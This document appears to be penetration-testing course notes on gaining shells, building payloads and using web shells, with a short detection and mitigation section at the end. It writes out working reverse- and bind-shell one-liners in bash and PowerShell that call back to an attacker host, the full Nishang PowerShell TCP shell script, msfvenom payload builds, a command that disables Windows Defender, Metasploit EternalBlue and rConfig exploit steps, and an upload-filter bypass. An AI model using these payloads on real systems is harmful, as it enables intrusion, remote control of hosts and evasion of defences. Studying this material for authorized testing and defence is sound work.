# Shells & Payloads

## Shells Jack Us In, Payloads Deliver Us Shells

Shell: interface to run commands and view output, gained by exploiting a vuln or bypassing controls. Payload: code that exploits a vuln and performs the intended action.

## Anatomy of a Shell

Terminal emulator: app to interact with a shell. Command language interpreter: program that parses input and issues tasks to the OS (defines available commands).

```bash
ps # list processes, confirms shell in use (e.g. bash)
env # show env vars, SHELL=<path> shows shell in use
```

## Bind Shells

Target runs a listener; attacker connects to it. Harder in real engagements — inbound firewall/NAT rules usually block it, and incoming connections are easier to detect.

```bash
nc -lvnp <PORT> # start listener on target (server side)
nc -nv <TARGET_IP> <PORT> # connect from attack box (client side)
```

Bind shell one-liner (serves /bin/bash over the listener):

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
```

Gotcha: requires a listener already running on target; OS/network firewalls often block unsolicited inbound connections.

## Reverse Shells

Attacker runs the listener; target initiates the connection out. Preferred since outbound traffic is more often allowed and overlooked by defenders.

```bash
sudo nc -lvnp <PORT> # attacker listener; use a common port (443) to blend with HTTPS
```

Windows PowerShell reverse shell one-liner (run on target):

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Disable Defender real-time protection (admin PowerShell), if needed to test:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Gotcha: AV can block the one-liner outright ("malicious content" ParserError) before it runs.

## Introduction to Payloads

Payload = the command/code that exploits a vuln and performs the action, once delivered to the target.

### Netcat/Bash Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

`rm -f /tmp/f` delete existing pipe | `mkfifo /tmp/f` create named pipe | `cat /tmp/f` feeds pipe to next cmd | `/bin/bash -i 2>&1` interactive shell, merge stderr into stdout | `nc <IP> <PORT> > /tmp/f` connect out, write response back into pipe

### PowerShell One-liner Explained

`powershell -nop -c "..."` no profile, run the quoted command block | `New-Object System.Net.Sockets.TCPClient(<IP>,<PORT>)` opens TCP connection to listener | `$stream = $client.GetStream()` network stream for I/O | `[byte[]]$bytes = 0..65535\|%{0}` empty byte buffer | `while($stream.Read(...) -ne 0)` reads incoming data in a loop | `iex $data 2>&1 \| Out-String` runs received command, captures output+errors as string | `(pwd).Path` appends working dir to the prompt | `GetBytes()` / `$stream.Write()` encodes and sends the response back | `$client.Close()` ends the TCP connection

Equivalent as a reusable script (Nishang's `Invoke-PowerShellTcp`, supports both reverse and bind):

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

## Automating Payloads & Delivery with Metasploit

Metasploit: automated exploitation framework (Rapid7) — pre-built modules exploit vulns and deliver payloads via simple option sets.

```bash
sudo msfconsole # launch the framework console
```

```bash
nmap -sC -sV -Pn <TARGET_IP> # -Pn skips host discovery, marks host up
```

```bash
search smb # search modules by keyword
use 56 # select module by listed number, or by full path
options # show module + payload options (alias: show options)
set RHOSTS <TARGET_IP>
set SHARE ADMIN$
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set LHOST <ATTACKER_IP>
exploit # run the module
```

`exploit/` module type | `windows/` target platform | `smb/` target service | `psexec` tool delivered to target

Uses valid admin creds (or a hash) to run an arbitrary payload, similar to SysInternals psexec; cleans up after itself (random service name/description).

Default payload `windows/meterpreter/reverse_tcp` — in-memory DLL injection, more functionality than a raw shell (upload/download, keylogger, process/service management).

```bash
shell # meterpreter: drop into native system shell
```

## Crafting Payloads with MSFvenom

msfvenom crafts standalone payloads (staged/stageless) for delivery without needing live MSF network access — e.g. via email, download link, USB.

```bash
msfvenom -l payloads # list all available payloads
```

Staged: small stage sent first, calls back to pull the rest, then executes — smaller footprint but less stable on poor links. Stageless: entire payload sent at once, no callback stage — better for low bandwidth/evasion.

Naming tells which: extra `/` separating components after the arch = staged (`linux/x86/shell/reverse_tcp`); no separation = stageless (`linux/x86/shell_reverse_tcp`, `linux/zarch/meterpreter_reverse_tcp`).

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > <OUTPUT_FILE>.elf
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > <OUTPUT_FILE>.exe
```

`-p` payload to use | `-f` output format | `LHOST`/`LPORT` callback address/port

## Infiltrating Windows

Fingerprinting Windows hosts, notable Windows vulns, Windows payload file types, and an example EternalBlue compromise chain.

### Prominent Windows Exploits

Historically significant Windows vulnerabilities and what each exploits.

`MS08-067` SMB flaw, used by the Conficker worm and Stuxnet | `EternalBlue (MS17-010)` SMBv1 RCE, NSA leak via Shadow Brokers, used in WannaCry/NotPetya | `PrintNightmare` RCE in Print Spooler, add a malicious driver for SYSTEM | `BlueKeep (CVE-2019-0708)` RDP RCE via a miscalled channel, Win2000–Server2008R2 | `Sigred (CVE-2020-1350)` DNS SIG record flaw, can net Domain Admin via the DC | `SeriousSam (CVE-2021-36934)` bad perms on `C:\Windows\system32\config`, exposes SAM via shadow copy backups | `Zerologon (CVE-2020-1472)` Netlogon (MS-NRPC) crypto flaw, ~256 guesses to reset a computer account password

### Enumerating Windows & Fingerprinting Methods

Quick checks to confirm a target is likely Windows before deeper enumeration.

```bash
ping <TARGET_IP> # TTL ~128 (or near) suggests Windows
sudo nmap -v -O <TARGET_IP> # OS detection scan
sudo nmap -v -O -A -Pn <TARGET_IP> # fallback if OS detection returns little
sudo nmap -v <TARGET_IP> --script banner.nse # banner grab on open ports
```

Gotcha: firewalls/security features can obscure fingerprint results; confirm with more than one method.

### Bats, DLLs, & MSI Files, Oh My!

Common Windows payload file types and their use.

`DLL` shared code library, inject or hijack to elevate to SYSTEM / bypass UAC | `.bat` DOS batch script, automate commands e.g. open a port or connect back | `VBS` lightweight scripting, used in phishing / macro-enabled docs | `MSI` Windows Installer package, run via `msiexec` for an elevated reverse shell | `PowerShell (.ps1)` .NET-based shell/scripting language, objects not just text

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

#### Payload Generation

`MSFVenom/Metasploit-Framework` enumerate, generate payloads, exploit, post-exploit | `Payloads All The Things` payload generation cheat sheets/resources | `Mythic C2` alternative C2 framework/payload generator | `Nishang` offensive PowerShell script collection | `Darkarmour` generates obfuscated Windows binaries

#### Payload Transfer and Execution

`Impacket` python toolset for network protocols (psexec, smbclient, wmiexec, Kerberos, stand up an SMB server) | `Payloads All The Things` quick file-transfer one-liners | `SMB (C$/ADMIN$)` host/transfer payloads, exfil data over shares | `MSF remote exec` many exploit modules build/stage/execute the payload automatically | `FTP/TFTP/HTTP(S)` other upload vectors — enumerate for availability

### Example Compromise Walkthrough

#### Enumerate the Host

```bash
nmap -v -A <TARGET_IP> # full enumeration scan
```

#### Determine an Exploit Path

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run # check if vulnerable to MS17-010
```

#### Select Exploit & Payload

```bash
search eternal
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
exploit
```

#### Identify the Native Shell

```bash
meterpreter > shell
```

Gotcha: a `PS C:\...>` prompt means PowerShell; plain `C:\...>` means cmd.exe. Confirm with `help`.

### CMD-Prompt and PowerShells for Fun and Profit

Use `cmd` when: older host (pre-Win7), simple tasks, batch/net/native tools, execution policy may block scripts. Use `PowerShell` when: cmdlets/custom scripts needed, .NET objects over text, cloud service interaction, scripts use aliases.

Gotcha: cmd keeps no command history; PowerShell does (stealth consideration). PowerShell isn't present pre-Windows 7.

### WSL and PowerShell For Linux

Gotcha: WSL and PowerShell Core (on Linux) network traffic may bypass Windows Firewall/Defender inspection — a current AV/EDR blind spot.

## Infiltrating Unix/Linux

Workflow for gaining and upgrading a shell on a Linux/Unix target, from enumeration through a non-interactive shell to a full TTY.

### Common Considerations

- Linux distribution running?
- Shell & programming languages present?
- Function of the system on the network?
- Application(s) hosted?
- Known vulnerabilities?

### Gaining a Shell Through Attacking a Vulnerable Application

```bash
nmap -sC -sV <TARGET_IP> # service + version enumeration
```

```bash
locate exploits # find local Metasploit module dirs (Pwnbox: /usr/share/metasploit-framework/modules/exploits)
apt update; apt install metasploit-framework # keep local MSF modules/db current
```

```bash
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
exploit
```

Chain: checks vulnerable rConfig version, authenticates to the web login, uploads a PHP payload, triggers it, deletes the payload, returns a Meterpreter session.

```bash
meterpreter > shell
```

### Spawning a TTY Shell with Python

Gotcha: webapp payloads often run as a low-priv service account (e.g. apache) with no shell defined — results in a non-tty/jail shell (`su`/`sudo` unusable).

```bash
which python # check python is present first
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Spawning Interactive Shells

Ways to get an interactive shell when landing in a limited/jail shell, using whatever interpreter is present on the target. `/bin/sh`/`/bin/bash` can be swapped for whatever interpreter the target actually has.

### /bin/sh -i

```bash
/bin/sh -i
```

### Perl

```bash
perl -e 'exec "/bin/sh";'
```

### Ruby

Run from a script/REPL.

```text
exec "/bin/sh"
```

### Lua

Run from a script/REPL.

```text
os.execute('/bin/sh')
```

### AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

### Find

```bash
find / -name <FILE> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \; # exec awk shell trick
find . -exec /bin/sh \; -quit # exec shell directly, quit after first match
```

Gotcha: if `find` can't locate the specified file, no shell is spawned.

### VIM

```bash
vim -c ':!/bin/sh' # spawn shell directly from invocation
```

Vim escape (from inside an already-open vim):

```text
:set shell=/bin/sh
:shell
```

### Execution Permissions Considerations

```bash
ls -la <FILE> # check permissions on a binary/file
sudo -l # list sudo permissions for current user
```

Gotcha: `sudo -l` needs a stable/interactive shell or may return nothing.
## Introduction to Web Shells

Web shell: browser-based shell session that interacts with the underlying OS of a web server via an uploaded payload written in a web language (PHP, JSP, ASPX, etc), controlled by calling the file in a browser. Needs a file upload (or similar) vuln first.

Common footholds: file upload, SQLi, RFI/LFI, command injection, password spraying (RDS/VPN portals/Citrix/OWA via AD auth), WAR file deployment on Tomcat/Axis2/WebLogic.

Relying on a web shell alone can be unstable, some apps delete uploads after a set time, upgrade to a reverse shell for persistence.

## Laudanum

Repo of ready-made injectable shell files (asp, aspx, jsp, php, etc) for multiple web languages. Built into Parrot OS and Kali.

Files location: `/usr/share/laudanum`

Edit the shell file to set the attack IP before use. Remove ASCII art/comments, they can be signatured by AV/defenders.

## Antak Webshell

### ASPX

ASPX: ASP.NET file type, server converts web form input to HTML. Used to host an ASPX web shell to control the underlying Windows OS.

Learning resource: ippsec.rocks

### Antak

Antak: PowerShell-based ASPX web shell (Nishang project). Executes each command as a new process, can execute scripts in memory, encodes commands sent.

Location: `/usr/share/nishang/Antak-WebShell/antak.aspx`

Set a username/password in the file before uploading, prevents unauthorized access to the shell.

## PHP Web Shells

PHP: most widely used server-side scripting language for web backends.

### Hands-on With a PHP-Based Web Shell

Tool: WhiteWinterWolf's PHP Web Shell

Default creds: `admin:admin`

Bypass an image-only upload restriction with Burp: intercept the upload POST, change `Content-Type` from `application/x-php` to `image/gif`, forward.

Webshell path after upload (rConfig vendor logo example): `/images/vendor/<FILE>.php`

### Considerations when Dealing with Web Shells

- Web apps can auto-delete uploaded files after a set period
- Limited interactivity: filesystem navigation, up/download, chained commands (`cmd1 && cmd2`) may not work, can be unstable
- Leaves more evidence of compromise than other methods

## Detection & Prevention

### Monitoring

MITRE ATT&CK tactics relevant to shells & payloads:

`Initial Access` compromise a public-facing host/service (web app, misconfigured SMB/auth, public vuln) for a foothold | `Execution` attacker-supplied code runs on the victim (web RCE, PowerShell one-liner via PsExec, public exploit via MSF, uploaded file triggered remotely) | `Command & Control` continued/interactive access after execution, often over allowed ports/protocols (HTTP/S, DNS, NTP, even Slack/Discord/Teams), ranges from cleartext (Netcat) to encrypted/obfuscated with proxies/redirectors/VPNs

#### Events To Watch For

- File uploads, check app logs for unexpected/malicious uploads
- Non-admin users issuing shell commands (e.g. `whoami`) or SMB share access end-host to end-host
- Anomalous network sessions: NetFlow top talkers, heartbeats on nonstandard ports (e.g. 4444, default Meterpreter port), bulk GET/POST in short windows

### Establish Network Visibility

Unencrypted shell traffic (e.g. Netcat) is fully visible to packet capture, including every command sent.

### Protecting End Devices

Keep Windows Defender (AV + firewall, all profiles) enabled, only exception approved apps via change management. Maintain patch management.

#### Potential Mitigations

- Application sandboxing: limit scope of access/damage from app vulns
- Least privilege: minimize user/admin rights
- Host segmentation & hardening: isolate internet-facing hosts (DMZ), follow STIG guides, limits lateral movement
- Firewalls (host + app layer): allow only established/approved outbound, deny inbound from non-required sources, breaks many bind/reverse shells (NAT can too)